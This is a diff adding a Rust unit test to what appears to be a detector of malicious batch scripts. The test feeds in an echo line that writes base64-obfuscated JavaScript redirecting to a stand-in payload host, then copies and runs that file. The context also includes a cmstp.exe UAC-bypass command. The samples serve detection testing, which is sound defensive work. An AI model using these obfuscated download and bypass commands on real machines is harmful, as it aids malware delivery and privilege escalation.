@@ -14471,6 +14471,23 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn replace_directory_destination_preserves_generated_script_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcmVwbGFjZS1kaXItanMuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+replace original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://replace-dir-js.example/payload")
+            }),
+            "replace copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmstp_au_direct_command_emits_uac_bypass_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"cmstp.exe /s /au C:\Users\Public\stage.inf"#, &mut env);
